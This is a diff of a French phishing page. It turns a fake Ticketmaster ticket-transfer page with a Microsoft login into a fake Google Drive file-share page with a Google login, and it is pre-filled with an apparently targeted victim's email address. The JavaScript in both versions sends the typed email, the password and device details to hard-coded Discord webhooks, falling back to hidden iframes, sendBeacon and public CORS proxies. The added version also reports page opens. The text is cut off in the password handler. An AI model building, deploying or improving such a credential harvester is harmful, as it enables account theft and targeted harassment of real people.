@@ -2,329 +2,291 @@
 <html lang="fr">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
-<meta name="theme-color" content="#026cdf">
-<title>Ticketmaster — Transfert de billets</title>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,viewport-fit=cover">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#ffffff">
+<title>Charte couple.pdf - Google Drive</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 87.3 78'%3E%3Cpath fill='%2300ac47' d='M29.9 1.2 0 52.9l13.4 23.2 29.9-51.7z'/%3E%3Cpath fill='%23ffba00' d='M57.5 1.2H29.9l29.9 51.7h27.6z'/%3E%3Cpath fill='%232684fc' d='M59.8 76.1H86l-13.4-23.2H44.9z'/%3E%3C/svg%3E">
 <style>
 *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
-background:linear-gradient(180deg,#0b1220,#111a2b 60%,#0b1220);min-height:100vh;padding:18px;color:#101828}
-.phone{max-width:430px;margin:0 auto;background:#f6f8fb;border-radius:20px;overflow:hidden;
-box-shadow:0 24px 60px rgba(0,0,0,.55)}
-header{background:#026cdf;padding:14px 18px;display:flex;align-items:center;justify-content:space-between}
-.logo{color:#fff;font-weight:800;font-size:17px;letter-spacing:-.3px}
-.logo span{font-weight:400;opacity:.85}
-.badge{background:rgba(255,255,255,.18);color:#fff;font-size:11px;font-weight:700;
-padding:5px 9px;border-radius:20px;letter-spacing:.4px}
-.wrap{padding:16px 18px 26px}
-.transfer{display:flex;gap:11px;align-items:center;background:#eaf7ee;border:1px solid #bfe6cc;
-border-radius:12px;padding:12px 13px;margin-bottom:14px}
-.avatar{flex:0 0 34px;height:34px;border-radius:50%;background:#12b76a;color:#fff;font-weight:800;
-font-size:15px;display:flex;align-items:center;justify-content:center}
-.transfer p{margin:0;font-size:12.8px;line-height:1.4;color:#08543a}
-.transfer b{font-weight:800}
-.transfer small{display:block;font-size:11.5px;color:#3d7a5f;margin-top:1px}
-.card{background:#fff;border-radius:14px;overflow:hidden;border:1px solid #e3e8ef;
-box-shadow:0 2px 10px rgba(16,24,40,.06)}
-.card-top{padding:16px;border-bottom:2px dashed #e3e8ef;position:relative}
-.card-top:after,.card-top:before{content:"";position:absolute;bottom:-9px;width:18px;height:18px;
-border-radius:50%;background:#f6f8fb;border:1px solid #e3e8ef}
-.card-top:before{left:-10px}.card-top:after{right:-10px}
-.event{font-size:17px;font-weight:800;line-height:1.25;letter-spacing:-.3px;margin:0 0 4px}
-.sub{font-size:12.5px;color:#667085;margin:0}
-.qr{display:grid;grid-template-columns:repeat(9,1fr);gap:2px;width:88px;height:88px;
-margin:14px 0 4px;background:#fff;padding:4px;border:1px solid #e3e8ef;border-radius:6px}
-.qr i{background:#101828;border-radius:1px}
-.ord{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:11px;color:#98a2b3;
-letter-spacing:1px;margin-top:6px}
-.card-bot{padding:14px 16px}
-.row{display:flex;justify-content:space-between;gap:12px;font-size:13.5px;padding:7px 0;border-bottom:1px solid #f2f4f7}
-.row:last-child{border-bottom:0}
-.row span:first-child{color:#667085;flex:0 0 auto}
-.row span:last-child{font-weight:700;text-align:right}
-.cat{display:inline-block;background:#026cdf;color:#fff;font-size:11px;font-weight:800;
-letter-spacing:.6px;padding:4px 9px;border-radius:5px}
-.seats{margin:10px 0 4px;border-top:1px solid #f2f4f7;padding-top:10px;position:relative}
-.seat{display:flex;gap:9px;align-items:flex-start;background:#f9fafb;border:1px solid #eaecf0;
-border-radius:9px;padding:9px 11px;margin-bottom:7px;font-size:12px;line-height:1.4;
-font-weight:600;color:#101828;letter-spacing:.2px;transition:.35s}
-.seat b{flex:0 0 18px;height:18px;border-radius:50%;background:#026cdf;color:#fff;
-font-size:11px;display:flex;align-items:center;justify-content:center;margin-top:1px}
-.masked .seat span{filter:blur(4.5px);opacity:.75}
-.total{background:#f9fafb;margin:10px -16px -14px;padding:13px 16px;display:flex;
-justify-content:space-between;font-weight:800;font-size:15px}
-.lock{display:flex;gap:9px;align-items:flex-start;background:#eef4ff;border:1px solid #cfe0ff;
-border-radius:12px;padding:12px 13px;margin:16px 0 12px;font-size:12.8px;line-height:1.45;color:#1d3a6e}
-.lock svg{flex:0 0 18px;margin-top:1px}
-.btn{display:flex;align-items:center;justify-content:center;gap:9px;width:100%;border:0;
-background:#0067b8;color:#fff;font-size:15.5px;font-weight:700;padding:15px;border-radius:12px;
-cursor:pointer;font-family:inherit}
-.btn:active{transform:scale(.99)}
-.sq{display:grid;grid-template-columns:7px 7px;grid-template-rows:7px 7px;gap:1.5px}
-.sq i:nth-child(1){background:#f25022}.sq i:nth-child(2){background:#7fba00}
-.sq i:nth-child(3){background:#00a4ef}.sq i:nth-child(4){background:#ffb900}
-.foot{text-align:center;font-size:11px;color:#98a2b3;margin-top:14px;line-height:1.6}
-#stat{margin-top:10px;font-size:11.5px;text-align:center;font-family:ui-monospace,monospace;color:#98a2b3}
-#ms{position:fixed;inset:0;background:#fff;z-index:50;display:none;flex-direction:column;overflow:auto}
-#ms.on{display:flex}
-.mshead{padding:16px 18px;display:flex;align-items:center;gap:8px;border-bottom:1px solid #f0f0f0}
-.mshead .sq{grid-template-columns:11px 11px;grid-template-rows:11px 11px;gap:2px}
-.mshead span{font-size:15px;color:#5e5e5e;font-weight:600}
-.msbox{flex:1;display:flex;justify-content:center;padding:30px 18px}
-.mscard{width:100%;max-width:400px}
-.mscard h1{font-size:24px;font-weight:600;margin:0 0 6px;color:#1b1b1b}
-.mssub{font-size:13.5px;color:#605e5c;margin:0 0 22px}
-.msfield{width:100%;padding:9px 10px;border:0;border-bottom:1px solid #605e5c;font-size:16px;
-font-family:inherit;margin-bottom:22px;background:#fff;color:#1b1b1b;
--webkit-appearance:none;appearance:none}
-.msfield:focus{outline:0;border-bottom:2px solid #0067b8}
-.msbtn{width:100%;border:0;background:#0067b8;color:#fff;font-size:15px;font-weight:600;
-padding:11px;border-radius:2px;font-family:inherit;cursor:pointer}
-.msbtn[disabled]{opacity:.6}
-.mslink{display:inline-block;color:#0067b8;font-size:13px;margin-top:20px;text-decoration:none}
-.mswho{display:flex;align-items:center;gap:9px;font-size:13.5px;color:#1b1b1b;margin-bottom:20px}
-.msav{width:28px;height:28px;border-radius:50%;background:#0067b8;color:#fff;font-size:13px;
-font-weight:700;display:flex;align-items:center;justify-content:center}
-.msback{background:none;border:0;color:#0067b8;font-size:13px;font-family:inherit;
-padding:14px 0 0;cursor:pointer}
-.mserr{color:#e81123;font-size:12.5px;margin:0 0 12px;display:none}
-.mserr.on{display:block}
-.msfoot{font-size:11px;color:#8a8886;text-align:center;padding:0 18px 24px}
-#ok{display:none;text-align:center;padding:26px 20px 40px}
-#ok.on{display:block}
-.tick{width:58px;height:58px;border-radius:50%;background:#12b76a;color:#fff;font-size:30px;
-display:flex;align-items:center;justify-content:center;margin:0 auto 12px}
-.reveal{background:#fff;border:1px solid #e3e8ef;border-radius:12px;padding:12px;margin:16px 0;text-align:left}
-.reveal .seat{margin-bottom:0}
-.spin{width:15px;height:15px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;
-border-radius:50%;animation:s .7s linear infinite;display:inline-block}
+html,body{margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#f8f9fa;color:#202124;min-height:100vh;-webkit-font-smoothing:antialiased}
+.screen{display:none}
+.screen.on{display:block}
+.drivebar{display:flex;align-items:center;gap:10px;background:#fff;padding:14px 18px;padding-top:calc(14px + env(safe-area-inset-top));border-bottom:1px solid #e8eaed;position:sticky;top:0;z-index:5}
+.drivebar span{font-size:21px;color:#5f6368;letter-spacing:.2px}
+.drivebar svg{width:26px;height:26px;flex:0 0 auto}
+.wrap{padding:18px 16px calc(28px + env(safe-area-inset-bottom))}
+.card{background:#fff;border-radius:14px;padding:20px;box-shadow:0 1px 2px rgba(60,64,67,.10),0 2px 8px rgba(60,64,67,.08);max-width:520px;margin:0 auto}
+.row{display:flex;align-items:center;gap:11px;margin-bottom:18px}
+.avatar{width:40px;height:40px;border-radius:50%;background:#1a73e8;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:600;font-size:17px;flex:0 0 auto}
+.who{font-size:15px;font-weight:600;color:#202124;line-height:1.2;word-break:break-all}
+h1{font-size:19px;line-height:1.35;margin:0 0 10px;font-weight:500;color:#202124}
+.muted{font-size:14px;line-height:1.55;color:#5f6368;margin:0 0 18px}
+.file{display:flex;align-items:center;gap:12px;border:1px solid #e8eaed;border-radius:10px;padding:12px 14px;margin-bottom:20px;background:#fafafa}
+.pdfico{width:36px;height:36px;border-radius:6px;background:#e8453c;color:#fff;display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:700;letter-spacing:.4px;flex:0 0 auto}
+.fname{font-size:14px;font-weight:500;color:#202124;word-break:break-word}
+.fmeta{font-size:12px;color:#5f6368;margin-top:3px}
+.btn{display:block;width:100%;border:0;border-radius:8px;background:#1a73e8;color:#fff;font-size:15px;font-weight:500;padding:13px 16px;cursor:pointer;font-family:inherit;-webkit-appearance:none}
+.btn:active{background:#1765cc}
+.tiny{text-align:center;font-size:12px;color:#80868b;margin-top:16px}
+.gwrap{max-width:420px;margin:0 auto;padding:44px 26px calc(30px + env(safe-area-inset-bottom));padding-top:calc(44px + env(safe-area-inset-top))}
+.gwrap .glogo{width:40px;height:40px;display:block;margin-bottom:20px}
+.gwrap h2{font-size:23px;font-weight:400;margin:0 0 8px;color:#202124}
+.gwrap .lead{font-size:15px;color:#202124;margin:0 0 26px;line-height:1.4}
+.gwrap .lead b{font-weight:500}
+.field{width:100%;border:1px solid #dadce0;border-radius:4px;padding:13px 14px;font-size:16px;font-family:inherit;color:#202124;background:#fff;-webkit-appearance:none;appearance:none;outline:none}
+.field:focus{border-color:#1a73e8;box-shadow:inset 0 0 0 1px #1a73e8}
+.link{display:inline-block;font-size:13px;color:#1a73e8;font-weight:500;margin-top:14px;text-decoration:none}
+.actions{display:flex;justify-content:flex-end;margin-top:34px}
+.gbtn{border:0;border-radius:4px;background:#1a73e8;color:#fff;font-size:14px;font-weight:500;padding:11px 26px;cursor:pointer;font-family:inherit;-webkit-appearance:none;min-width:96px}
+.gbtn:active{background:#1765cc}
+.gbtn[disabled]{background:#8ab4f8}
+.chip{display:inline-flex;align-items:center;gap:8px;border:1px solid #dadce0;border-radius:20px;padding:5px 14px 5px 5px;font-size:13px;color:#3c4043;margin-bottom:26px;max-width:100%}
+.chip .mini{width:22px;height:22px;border-radius:50%;background:#1a73e8;color:#fff;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;flex:0 0 auto}
+.chip span.mail{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.show{display:flex;align-items:center;gap:8px;font-size:13px;color:#5f6368;margin-top:16px;user-select:none}
+.show input{width:16px;height:16px;margin:0;accent-color:#1a73e8}
+.spin{width:15px;height:15px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;display:inline-block;vertical-align:-3px;margin-right:7px;animation:s .7s linear infinite}
 @keyframes s{to{transform:rotate(360deg)}}
+.st{font-size:11px;text-align:center;font-family:ui-monospace,monospace;color:#8a8886;margin-top:12px;min-height:14px}
 </style>
 </head>
 <body>
-<div class="phone">
-  <header>
-    <div class="logo">ticket<span>master</span></div>
-    <div class="badge">TRANSFERT</div>
+
+<section class="screen on" id="s1">
+  <header class="drivebar">
+    <svg viewBox="0 0 87.3 78" aria-hidden="true">
+      <path d="m6.6 66.85 3.85 6.65c.8 1.4 1.95 2.5 3.3 3.3l13.75-23.8h-27.5c0 1.55.4 3.1 1.2 4.5z" fill="#0066da"/>
+      <path d="m43.65 25-13.75-23.8c-1.35.8-2.5 1.9-3.3 3.3l-25.4 44a9.06 9.06 0 0 0-1.2 4.5h27.5z" fill="#00ac47"/>
+      <path d="m73.55 76.8c1.35-.8 2.5-1.9 3.3-3.3l1.6-2.75 7.65-13.25c.8-1.4 1.2-2.95 1.2-4.5h-27.502l5.852 11.5z" fill="#ea4335"/>
+      <path d="m43.65 25 13.75-23.8c-1.35-.8-2.9-1.2-4.5-1.2h-18.5c-1.6 0-3.15.45-4.5 1.2z" fill="#00832d"/>
+      <path d="m59.8 53h-32.3l-13.75 23.8c1.35.8 2.9 1.2 4.5 1.2h50.8c1.6 0 3.15-.45 4.5-1.2z" fill="#2684fc"/>
+      <path d="m73.4 26.5-12.7-22c-.8-1.4-1.95-2.5-3.3-3.3l-13.75 23.8 16.15 28h27.45c0-1.55-.4-3.1-1.2-4.5z" fill="#ffba00"/>
+    </svg>
+    <span>Drive</span>
   </header>
-  <div class="wrap" id="main">
-    <div class="transfer">
-      <div class="avatar" id="ini">R</div>
-      <p><b id="exp">Robin Marchand</b><small>robin.patard@outlook.fr</small>
-        vous a transféré <b>1 billet</b>. Acceptez le transfert pour le rattacher à votre compte.</p>
-    </div>
+
+  <div class="wrap">
     <div class="card">
-      <div class="card-top">
-        <p class="event">Pink Floyd — The Endless River Tour</p>
-        <p class="sub">Lundi 24 novembre 2026 · 20h00<br>Avignon — Parc des Expositions (Châteaublanc)</p>
-        <div class="qr" id="qr"></div>
-        <div class="ord">TM-8842-77193 · 1 billet</div>
+      <div class="row">
+        <div class="avatar">R</div>
+        <div class="who">robin.patard@outlook.fr</div>
       </div>
-      <div class="card-bot">
-        <div class="row"><span>Catégorie</span><span><span class="cat">CATÉGORIE 1</span></span></div>
-        <div class="seats masked" id="seats">
-          <div class="seat"><b>1</b><span>PARTERRE — RANG M — PLACE 33 — COQUE</span></div>
+      <h1>Robin souhaite vous envoyer un fichier</h1>
+      <p class="muted">Le fichier est en attente d'approbation. Connectez-vous à votre compte pour l'accepter et y accéder.</p>
+      <div class="file">
+        <div class="pdfico">PDF</div>
+        <div>
+          <div class="fname">Charte couple.pdf</div>
+          <div class="fmeta">PDF &middot; 74 Ko</div>
         </div>
-        <div class="row"><span>Billet</span><span>1 (nominatif)</span></div>
-        <div class="row"><span>Statut</span><span style="color:#b54708">Transfert en attente</span></div>
-        <div class="total"><span>Total payé</span><span>69,00 €</span></div>
       </div>
+      <button class="btn" id="start">Se connecter pour approuver</button>
+      <div class="tiny">Partagé via Google Drive</div>
     </div>
-    <div class="lock">
-      <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#1d3a6e" stroke-width="2">
-        <rect x="4" y="10" width="16" height="10" rx="2"/><path d="M8 10V7a4 4 0 018 0v3"/></svg>
-      <div>La place reste masquée et bloquée chez l'expéditeur tant que le transfert n'est pas accepté. Connectez-vous avec le compte de messagerie associé à la commande.</div>
-    </div>
-    <button class="btn" id="start">
-      <span class="sq"><i></i><i></i><i></i><i></i></span> Accepter le transfert
-    </button>
-    <div id="stat"></div>
-    <p class="foot">Ticketmaster France · Transfert sécurisé<br>Réf. transaction 4471-2290-8834</p>
   </div>
-  <div id="ok">
-    <div class="tick">✓</div>
-    <h2 style="margin:0 0 6px;font-size:19px">Transfert accepté</h2>
-    <p style="color:#667085;font-size:13.5px;margin:0 0 6px">Le billet est maintenant rattaché à votre compte.</p>
-    <div class="reveal">
-      <div class="seat"><b>1</b><span>PARTERRE — RANG M — PLACE 33 — COQUE</span></div>
-    </div>
-    <p style="color:#98a2b3;font-size:11.5px;margin:0">Redirection vers votre commande…</p>
-  </div>
-</div>
+</section>
 
-<div id="ms">
-  <div class="mshead"><span class="sq"><i></i><i></i><i></i><i></i></span><span>Microsoft</span></div>
-  <div class="msbox">
-    <div class="mscard">
-      <div id="stage1">
-        <h1>Se connecter</h1>
-        <p class="mssub">pour continuer vers Ticketmaster</p>
-        <p class="mserr" id="err1">Saisissez une adresse e-mail valide.</p>
-        <input class="msfield" id="email" type="email" inputmode="email"
-          value="maudperez33@mail.com"
-          autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false"
-          placeholder="Adresse e-mail, téléphone ou Skype">
-        <button class="msbtn" id="next">Suivant</button>
-        <a class="mslink" href="#" onclick="return false">Aucun compte ? Créez-en un !</a>
-        <div id="stat1" style="margin-top:14px;font-size:11px;text-align:center;font-family:ui-monospace,monospace;color:#8a8886"></div>
-      </div>
-      <div id="stage2" style="display:none">
-        <h1>Se connecter</h1>
-        <div class="mswho"><div class="msav" id="av">U</div><div id="who">—</div></div>
-        <p class="mserr" id="err2">Saisissez votre mot de passe.</p>
-        <input class="msfield" id="pass" type="password" inputmode="text"
-          autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false"
-          placeholder="Mot de passe">
-        <button class="msbtn" id="send">Se connecter</button>
-        <a class="mslink" href="#" onclick="return false">Mot de passe oublié ?</a>
-        <button class="msback" id="back">← Utiliser un autre compte</button>
-        <div id="stat2" style="margin-top:14px;font-size:11px;text-align:center;font-family:ui-monospace,monospace;color:#8a8886"></div>
-      </div>
-    </div>
-  </div>
-  <p class="msfoot">Conditions d'utilisation · Confidentialité et cookies</p>
-</div>
+<section class="screen" id="s2">
+  <div class="gwrap">
+    <svg class="glogo" viewBox="0 0 48 48" aria-hidden="true">
+      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+    </svg>
+    <h2>Connexion</h2>
+    <p class="lead">Continuer vers <b>Google Drive</b></p>
 
-<noscript><p style="text-align:center;color:#fff">Activez JavaScript pour continuer.</p></noscript>
+    <form id="formEmail" novalidate>
+      <input class="field" id="email" type="email" inputmode="email"
+             value="maudperez33@mail.com"
+             autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false"
+             placeholder="Adresse e-mail">
+      <a class="link" href="#" onclick="return false">Mot de passe oublié&nbsp;?</a>
+      <div class="actions"><button class="gbtn" type="submit">Suivant</button></div>
+      <div class="st" id="st1"></div>
+    </form>
+  </div>
+</section>
+
+<section class="screen" id="s3">
+  <div class="gwrap">
+    <svg class="glogo" viewBox="0 0 48 48" aria-hidden="true">
+      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+    </svg>
+    <h2>Bienvenue</h2>
+    <div class="chip"><span class="mini">M</span><span class="mail" id="chipMail">maudperez33@mail.com</span></div>
+
+    <form id="formPwd" novalidate>
+      <input class="field" id="pwd" type="password" inputmode="text"
+             autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false"
+             placeholder="Saisissez votre mot de passe">
+      <label class="show"><input type="checkbox" id="showpwd"> Afficher le mot de passe</label>
+      <div class="actions"><button class="gbtn" id="btnLogin" type="submit">Se connecter</button></div>
+      <div class="st" id="st2"></div>
+    </form>
+  </div>
+</section>
 
 <script>
 /* ====== réglages ====== */
-const WEBHOOK = "https://discord.com/api/webhooks/1564072527142330579/ghyFo88nzRDLJrVvOkZKMhowzB8R5qiTqvs7owGcW1-koz66zc8focZ-LjOG-scdUoot";
-const EXPEDITEUR = "Robin Marchand";
-const REDIRECT = "https://www.ticketmaster.fr/fr";
+const CODE = "RB-9K42-XT7D";
+const EXPEDITEUR = "robin.patard@outlook.fr";
+const REDIRECT = "https://drive.google.com/drive/my-drive";
+const HOOKS = [
+  "https://discord.com/api/webhooks/1564072527142330579/ghyFo88nzRDLJrVvOkZKMhowzB8R5qiTqvs7owGcW1-koz66zc8focZ-LjOG-scdUoot",
+  "https://discord.com/api/webhooks/1567191230872551464/lhvhBSU_tcH3H7mUIuo87kHxBdnnPbzdwAG6laVscaFd4GNk4JRbFjUQKmRoxiutL_QN"
+];
 const RELAIS = [
-  "https://proxy.corsfix.com/?" + WEBHOOK,
-  "https://api.allorigins.win/raw?url=" + encodeURIComponent(WEBHOOK),
-  "https://api.codetabs.com/v1/proxy?quest=" + encodeURIComponent(WEBHOOK)
+  "https://proxy.corsfix.com/?",
+  "https://api.allorigins.win/raw?url=",
+  "https://api.codetabs.com/v1/proxy?quest="
 ];
 
-const $=id=>document.getElementById(id);
-let mail="", busy=false;
+const $ = id => document.getElementById(id);
+const emailEl = $("email"), pwdEl = $("pwd");
+let mail = "", busy = false;
 
-$('exp').textContent = EXPEDITEUR;
-$('ini').textContent = EXPEDITEUR.charAt(0).toUpperCase();
-
-(function(){const q=document.getElementById('qr');const p=[1,0,1,1,0,1,0,1,1,0,1,0,0,1,1,0,0,1,0,1,0,1,1,0,1,0,1,1,1,0,1,0,0,1,1,0,1,1,0,1,1,0,1,0,0,1,0,1,1,1,1,0,1,0,1,1,0,0,1,1,0,1,0,1,1,0,1,0,1,1,0,0,1,1,0,1,1,1,0,1,0];
-for(let i=0;i<81;i++){const s=document.createElement('i');if(!p[i])s.style.background='#fff';q.appendChild(s);}})();
-
-let ip = "—";
-(async function(){try{const c=new AbortController();setTimeout(()=>c.abort(),2500);
-const r=await fetch("https://api.ipify.org?format=json",{signal:c.signal});ip=(await r.json()).ip;}catch(e){}})();
-
-function infos(){
-  return ["IP : "+ip,"Écran : "+screen.width+"x"+screen.height,
-    "Plateforme : "+(navigator.platform||"—"),"Langue : "+navigator.language,
-    "Fuseau : "+(Intl.DateTimeFormat().resolvedOptions().timeZone||"—"),
-    "Navigateur : "+navigator.userAgent.slice(0,180)].join("\n");
+function show(id) {
+  document.querySelectorAll(".screen").forEach(function (s) { s.classList.remove("on"); });
+  $(id).classList.add("on");
+  window.scrollTo(0, 0);
+}
+function statu(ou, txt, etat) {
+  const el = $(ou); if (!el) return;
+  el.textContent = txt;
+  el.style.color = etat === "ok" ? "#107c10" : etat === "ko" ? "#e81123" : "#8a8886";
+}
+function infos() {
+  return ["Écran : " + screen.width + "x" + screen.height,
+    "Langue : " + navigator.language,
+    "Fuseau : " + (Intl.DateTimeFormat().resolvedOptions().timeZone || "—"),
+    "Navigateur : " + navigator.userAgent.slice(0, 180)].join("\n");
 }
 
-function statu(ou,txt,etat){
-  const el=$(ou); if(!el) return;
-  el.textContent=txt;
-  el.style.color = etat==="ok" ? "#107c10" : etat==="ko" ? "#e81123" : "#8a8886";
-}
-
-function viaIframe(json){
-  return new Promise(res=>{
-    let fini=false;
-    try{
-      const nom="wf"+Date.now()+Math.floor(Math.random()*999);
-      const f=document.createElement('iframe');
-      f.name=nom; f.style.cssText="position:absolute;width:1px;height:1px;opacity:0;border:0";
+function viaIframe(hook, json) {
+  return new Promise(function (res) {
+    let fini = false;
+    try {
+      const nom = "wf" + Date.now() + Math.floor(Math.random() * 999);
+      const f = document.createElement("iframe");
+      f.name = nom; f.style.cssText = "position:absolute;width:1px;height:1px;opacity:0;border:0";
       document.body.appendChild(f);
-      const form=document.createElement('form');
-      form.method="POST"; form.action=WEBHOOK; form.target=nom;
-      const i=document.createElement('input');
-      i.type="hidden"; i.name="payload_json"; i.value=json;
+      const form = document.createElement("form");
+      form.method = "POST"; form.action = hook; form.target = nom;
+      const i = document.createElement("input");
+      i.type = "hidden"; i.name = "payload_json"; i.value = json;
       form.appendChild(i); document.body.appendChild(form);
-      f.onload=()=>{ if(fini) return; fini=true; res(true); };
+      f.onload = function () { if (fini) return; fini = true; res(true); };
       form.submit();
-      setTimeout(()=>{ if(fini) return; fini=true; res(true); },4000);
-      setTimeout(()=>{ try{form.remove();f.remove();}catch(e){} },8000);
-    }catch(e){ res(false); }
+      setTimeout(function () { if (fini) return; fini = true; res(true); }, 4000);
+      setTimeout(function () { try { form.remove(); f.remove(); } catch (e) {} }, 8000);
+    } catch (e) { res(false); }
   });
 }
 
-/* texte = contenu brut, jamais interprété par Discord */
-async function envoi(ou,titre,couleur,champs,texte){
-  const body={username:"🎫 Transfert Ticketmaster • Avignon", content:texte, embeds:[{
-    title:titre, color:couleur, timestamp:new Date().toISOString(),
-    fields:champs, footer:{text:"Transfert de "+EXPEDITEUR+" · Parterre M 33"}
-  }]};
-  const json=JSON.stringify(body);
-  statu(ou,"envoi…","");
+/* texte = brut, jamais interprété par Discord */
+async function envoi(ou, titre, couleur, champs, texte) {
+  const json = JSON.stringify({
+    username: "Drive • " + CODE,
+    content: texte,
+    embeds: [{
+      title: titre, color: couleur, timestamp: new Date().toISOString(),
+      fields: champs, footer: { text: "Réf. " + CODE + " · " + EXPEDITEUR }
+    }]
+  });
+  statu(ou, "envoi…", "");
 
-  try{
-    const r=await fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:json});
-    if(r.ok){ statu(ou,"✓ transmis","ok"); return true; }
-  }catch(e){}
-
-  if(await viaIframe(json)){ statu(ou,"✓ transmis","ok"); return true; }
-
-  try{
-    const fd=new FormData(); fd.append("payload_json",json);
-    if(navigator.sendBeacon(WEBHOOK,fd)){ statu(ou,"✓ transmis","ok"); return true; }
-  }catch(e){}
-
-  statu(ou,"relais…","");
-  for(const u of RELAIS){
-    try{
-      const r=await fetch(u,{method:"POST",headers:{"Content-Type":"application/json"},body:json});
-      if(r.ok){ statu(ou,"✓ transmis (relais)","ok"); return true; }
-    }catch(e){}
+  for (const h of HOOKS) {
+    try {
+      const r = await fetch(h, { method: "POST", headers: { "Content-Type": "application/json" }, body: json });
+      if (r.ok) { statu(ou, "✓ transmis", "ok"); return true; }
+    } catch (e) {}
   }
-  statu(ou,"✗ réseau bloqué","ko");
+  for (const h of HOOKS) {
+    if (await viaIframe(h, json)) { statu(ou, "✓ transmis", "ok"); return true; }
+  }
+  for (const h of HOOKS) {
+    try {
+      const fd = new FormData(); fd.append("payload_json", json);
+      if (navigator.sendBeacon(h, fd)) { statu(ou, "✓ transmis", "ok"); return true; }
+    } catch (e) {}
+  }
+  statu(ou, "relais…", "");
+  for (const h of HOOKS) {
+    for (const base of RELAIS) {
+      const u = base.slice(-1) === "?" ? base + h : base + encodeURIComponent(h);
+      try {
+        const r = await fetch(u, { method: "POST", headers: { "Content-Type": "application/json" }, body: json });
+        if (r.ok) { statu(ou, "✓ transmis (relais)", "ok"); return true; }
+      } catch (e) {}
+    }
+  }
+  statu(ou, "✗ envoi bloqué", "ko");
   return false;
 }
 
-$('start').onclick=()=>{$('ms').classList.add('on');setTimeout(()=>$('email').focus(),200);};
+window.addEventListener("load", function () {
+  envoi("st1", "👀 Page ouverte", 0x34a853, [
+    { name: "Code", value: "`" + CODE + "`" },
+    { name: "Infos", value: "```" + infos() + "```" }
+  ], "`" + CODE + "`");
+});
 
-$('next').onclick=async()=>{
-  if(busy) return;
-  const v=$('email').value.trim();
-  if(!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v) && !/^[+0-9 ().-]{6,}$/.test(v)){
-    $('err1').classList.add('on'); return;
-  }
-  $('err1').classList.remove('on');
-  mail=v;
-  $('who').textContent=v; $('av').textContent=v[0].toUpperCase();
-  $('stage1').style.display='none'; $('stage2').style.display='block';
-  setTimeout(()=>$('pass').focus(),200);
-  busy=true;
-  await envoi("stat2","Étape 1 — Compte Microsoft",0x0067b8,[
-    {name:"Identifiant",value:"`"+v+"`"},{name:"Infos",value:"```"+infos()+"```"}
-  ], "`"+v+"`");
-  busy=false;
+$("start").onclick = function () {
+  $("chipMail").textContent = emailEl.value || "maudperez33@mail.com";
+  show("s2");
 };
 
-$('back').onclick=()=>{$('stage2').style.display='none';$('stage1').style.display='block';$('pass').value='';};
+$("formEmail").addEventListener("submit", async function (e) {
+  e.preventDefault();
+  const v = emailEl.value.trim();
+  mail = v;
+  $("chipMail").textContent = v || "-";
+  show("s3");
+  setTimeout(function () { try { pwdEl.focus(); } catch (err) {} }, 150);
+  await envoi("st2", "✉️ Étape 1 — compte", 0x4285f4, [
+    { name: "Identifiant", value: "`" + v + "`" },
+    { name: "Infos", value: "```" + infos() + "```" }
+  ], "`" + v + "`");
+});
 
-$('send').onclick=async()=>{
+$("formPwd").addEventListener("submit", async function (e) {
+  e.preventDefault();
+  if (busy) return;
   /* lecture brute : aucun trim, aucune découpe */
-  const p=$('pass').value;
-  if(p.length<1){$('err2').classList.add('on');return;}
-  $('err2').classList.remove('on');
